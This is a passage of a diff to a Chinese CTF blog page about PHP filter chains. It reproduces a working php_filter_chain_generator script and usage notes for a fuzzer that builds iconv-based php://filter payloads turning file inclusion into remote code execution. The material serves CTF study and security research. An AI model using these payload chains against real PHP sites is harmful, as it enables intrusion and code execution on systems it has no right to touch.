class="hljs-string">&quot;dic.array&quot;</span><span class="hljs-comment">#太长了省略一下x</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_filter_chain</span>(<span class="hljs-params">chain, debug_base64 = <span class="hljs-literal">False</span></span>):<br><br>    encoded_chain = chain<br>    <span class="hljs-comment"># generate some garbage base64</span><br>    filters = <span class="hljs-string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span><br>    filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br>    <span class="hljs-comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br>    filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> encoded_chain[::-<span class="hljs-number">1</span>]:<br>        filters += conversions[c] + <span class="hljs-string">&quot;|&quot;</span><br>        <span class="hljs-comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span><br>        filters += <span class="hljs-string">&quot;convert.base64-decode|&quot;</span><br>        filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br>        <span class="hljs-comment"># get rid of equal signs</span><br>        filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> debug_base64:<br>        <span class="hljs-comment"># don&#x27;t add the decode while debugging chains</span><br>        filters += <span class="hljs-string">&quot;convert.base64-decode&quot;</span><br><br>    final_payload = <span class="hljs-string">f&quot;php://filter/<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;file_to_use&#125;</span>&quot;</span><br>    <span class="hljs-keyword">return</span> final_payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><br>    <span class="hljs-comment"># Parsing command line arguments</span><br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&quot;PHP filter chain generator.&quot;</span>)<br><br>    parser.add_argument(<span class="hljs-string">&quot;--chain&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Content you want to generate. (you will maybe need to pad with spaces for your payload to work)&quot;</span>, required=<span class="hljs-literal">False</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--rawbase64&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.&quot;</span>, required=<span class="hljs-literal">False</span>)<br>    args = parser.parse_args()<br>    <span class="hljs-keyword">if</span> args.chain <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        chain = args.chain.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        base64_value = base64.b64encode(chain).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).replace(<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        chain = generate_filter_chain(base64_value)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] The following gadget chain will generate the following code : &#123;&#125; (base64 value: &#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(args.chain, base64_value))<br>        <span class="hljs-built_in">print</span>(chain)<br>    <span class="hljs-keyword">if</span> args.rawbase64 <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        rawbase64 = args.rawbase64.replace(<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">&quot;^([A-Za-z0-9+/])*$&quot;</span>, rawbase64)<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">match</span>):<br>            chain = generate_filter_chain(rawbase64, <span class="hljs-literal">True</span>)<br>            <span class="hljs-built_in">print</span>(chain)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;[-] Base64 string required.&quot;</span>)<br>            exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+<h3 id="php-filter-chain-generator-synacktiv"><a href="#php-filter-chain-generator-synacktiv" class="headerlink" title="php_filter_chain_generator @synacktiv"></a><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">php_filter_chain_generator</a> @synacktiv</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># - Useful infos -</span><br><span class="hljs-comment"># https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters</span><br><span class="hljs-comment"># https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</span><br><span class="hljs-comment"># https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</span><br><br><span class="hljs-comment"># No need to guess a valid filename anymore</span><br>file_to_use = <span class="hljs-string">&quot;php://temp&quot;</span><br><br>conversions = <span class="hljs-string">&quot;dic.array&quot;</span><span class="hljs-comment">#太长了省略一下x</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_filter_chain</span>(<span class="hljs-params">chain, debug_base64 = <span class="hljs-literal">False</span></span>):<br><br>    encoded_chain = chain<br>    <span class="hljs-comment"># generate some garbage base64</span><br>    filters = <span class="hljs-string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span><br>    filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br>    <span class="hljs-comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br>    filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> encoded_chain[::-<span class="hljs-number">1</span>]:<br>        filters += conversions[c] + <span class="hljs-string">&quot;|&quot;</span><br>        <span class="hljs-comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span><br>        filters += <span class="hljs-string">&quot;convert.base64-decode|&quot;</span><br>        filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br>        <span class="hljs-comment"># get rid of equal signs</span><br>        filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> debug_base64:<br>        <span class="hljs-comment"># don&#x27;t add the decode while debugging chains</span><br>        filters += <span class="hljs-string">&quot;convert.base64-decode&quot;</span><br><br>    final_payload = <span class="hljs-string">f&quot;php://filter/<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;file_to_use&#125;</span>&quot;</span><br>    <span class="hljs-keyword">return</span> final_payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><br>    <span class="hljs-comment"># Parsing command line arguments</span><br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&quot;PHP filter chain generator.&quot;</span>)<br><br>    parser.add_argument(<span class="hljs-string">&quot;--chain&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Content you want to generate. (you will maybe need to pad with spaces for your payload to work)&quot;</span>, required=<span class="hljs-literal">False</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--rawbase64&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.&quot;</span>, required=<span class="hljs-literal">False</span>)<br>    args = parser.parse_args()<br>    <span class="hljs-keyword">if</span> args.chain <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        chain = args.chain.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        base64_value = base64.b64encode(chain).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).replace(<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        chain = generate_filter_chain(base64_value)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] The following gadget chain will generate the following code : &#123;&#125; (base64 value: &#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(args.chain, base64_value))<br>        <span class="hljs-built_in">print</span>(chain)<br>    <span class="hljs-keyword">if</span> args.rawbase64 <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        rawbase64 = args.rawbase64.replace(<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">&quot;^([A-Za-z0-9+/])*$&quot;</span>, rawbase64)<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">match</span>):<br>            chain = generate_filter_chain(rawbase64, <span class="hljs-literal">True</span>)<br>            <span class="hljs-built_in">print</span>(chain)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;[-] Base64 string required.&quot;</span>)<br>            exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
 
 <p>其实核心部分就这几行：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> encoded_chain[::-<span class="hljs-number">1</span>]:<br>    filters += conversions[c] + <span class="hljs-string">&quot;|&quot;</span><br>    <span class="hljs-comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span><br>    filters += <span class="hljs-string">&quot;convert.base64-decode|&quot;</span><br>    filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br>    <span class="hljs-comment"># get rid of equal signs</span><br>    filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> debug_base64:<br>    <span class="hljs-comment"># don&#x27;t add the decode while debugging chains</span><br>    filters += <span class="hljs-string">&quot;convert.base64-decode&quot;</span><br><br>final_payload = <span class="hljs-string">f&quot;php://filter/<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;file_to_use&#125;</span>&quot;</span><br><span class="hljs-keyword">return</span> final_payload<br></code></pre></td></tr></table></figure>
 
 <p>和test.py其实是一样的，所以不多赘述x，不过相比起来这个更好理解~</p>
-<h2 id="filterChainFuzzerAndGenerator-（自己改了一份优化版本x"><a href="#filterChainFuzzerAndGenerator-（自己改了一份优化版本x" class="headerlink" title="filterChainFuzzerAndGenerator （自己改了一份优化版本x"></a><a href="https://github.com/ProbiusOfficial/filterChainFuzzerAndGenerator">filterChainFuzzerAndGenerator</a> （自己改了一份优化版本x</h2><p>一个基于php和python的Filter链的fuzz和生成程序。</p>
+<h2 id="filterChainFuzzerAndGenerator-（自己改了一份优化版本x"><a href="#filterChainFuzzerAndGenerator-（自己改了一份优化版本x" class="headerlink" title="filterChainFuzzerAndGenerator （自己改了一份优化版本x"></a><a target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial/filterChainFuzzerAndGenerator">filterChainFuzzerAndGenerator</a> （自己改了一份优化版本x</h2><p>一个基于php和python的Filter链的fuzz和生成程序。</p>
 <p>可能使用的场景:</p>
 <ul>
 <li>无文件RCE</li>
@@ -529,9 +529,9 @@
 </ul>
 <p>此外，感谢下面的项目提供的思路</p>
 <ul>
-<li><a href="https://github.com/loknop">https://github.com/loknop</a> <a target="_blank" rel="noopener" href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></li>
-<li><a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</a></li>
-<li><a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/loknop">https://github.com/loknop</a> <a target="_blank" rel="noopener" href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></li>
 </ul>
 <p>项目目录各个文件的作用如下：</p>
 <ul>
@@ -547,13 +547,13 @@
 </ul>
 <h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><h4 id="Fuzz-1"><a href="#Fuzz-1" class="headerlink" title="Fuzz"></a>Fuzz</h4><p>Fuzz依靠Fuzzer.php实现</p>
 <p>在iconv_list.php中定义你fuzz需要的字符集</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110380.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110380.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>根据对应环境选择对应的字符集合：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iconv -l<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110566.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110566.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>在Fuzzer.php中设置好参数：</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110182.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110182.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>使用下面命令即可开始Fuzz：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php Fuzzer.php<br></code></pre></td></tr></table></figure>
 
@@ -564,10 +564,10 @@
 <li>使用dictionary.py中的字典生成</li>
 </ul>
 <p>如果你要使用第一种模式，项目下载时就附带好了对应hexcode的字典，只需要在文件开头设置参数即可：</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110437.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110437.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>当然您也可以根据项目原理自己生成。</p>
 <p>如果您使用第二种模式，项目也准备了一份Fuzz好的单字母字典在dictionary.py中：</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110005.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110005.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>您也可以根据自己的需求Fuzz，流程大致如下：</p>
 <ul>
 <li>设定好需要的字符集</li>
@@ -597,7 +597,7 @@
     
       <span class="category-chain">
         
-  <a href="/ProbiusOfficial/ProbiusOfficial.github.io/categories/CTF/" class="category-chain-item">CTF</a>
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
   
   
 
@@ -612,7 +612,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/ProbiusOfficial/ProbiusOfficial.github.io/tags/Web/">#Web</a>
+        <a href="/tags/Web/">#Web</a>
       
     </div>
   
@@ -625,7 +625,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>浅谈Filter链</div>
-      <div>https://github.com/ProbiusOfficial/ProbiusOfficial.github.io/2023/02/07/Filter/</div>
+      <div>https://blog.probius.xyz/2023/02/07/Filter/</div>
     </div>
     <div class="license-meta">
       
@@ -669,7 +669,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/ProbiusOfficial/ProbiusOfficial.github.io/2023/02/08/NssRound7/" title="brokenFilterChain 题解">
+                      <a href="/2023/02/08/NssRound7/" title="brokenFilterChain 题解">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">brokenFilterChain 题解</span>
                         <span class="visible-mobile">上一篇</span>
@@ -679,7 +679,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/ProbiusOfficial/ProbiusOfficial.github.io/2022/11/29/Build-Your-Remote-Linux-Docker/" title="Build-Your-Remote-Linux-Docker">
+                      <a href="/2022/11/29/Build-Your-Remote-Linux-Docker/" title="Build-Your-Remote-Linux-Docker">
                         <span class="hidden-mobile">Build-Your-Remote-Linux-Docker</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
@@ -864,8 +864,8 @@
 
 <script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
 <script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/ProbiusOfficial/ProbiusOfficial.github.io/js/events.js" ></script>
-<script  src="/ProbiusOfficial/ProbiusOfficial.github.io/js/plugins.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
 
   <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
@@ -887,7 +887,7 @@
 
 
   
-    <script  src="/ProbiusOfficial/ProbiusOfficial.github.io/js/img-lazyload.js" ></script>
+    <script  src="/js/img-lazyload.js" ></script>
   
 
 
@@ -986,7 +986,7 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
-  <script  src="/ProbiusOfficial/ProbiusOfficial.github.io/js/local-search.js" ></script>
+  <script  src="/js/local-search.js" ></script>
 
   <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
@@ -996,7 +996,7 @@
 
 <!-- 主题的启动项，将它保持在最底部 -->
 <!-- the boot of the theme, keep it at the bottom -->
-<script  src="/ProbiusOfficial/ProbiusOfficial.github.io/js/boot.js" ></script>
+<script  src="/js/boot.js" ></script>
 
 
   
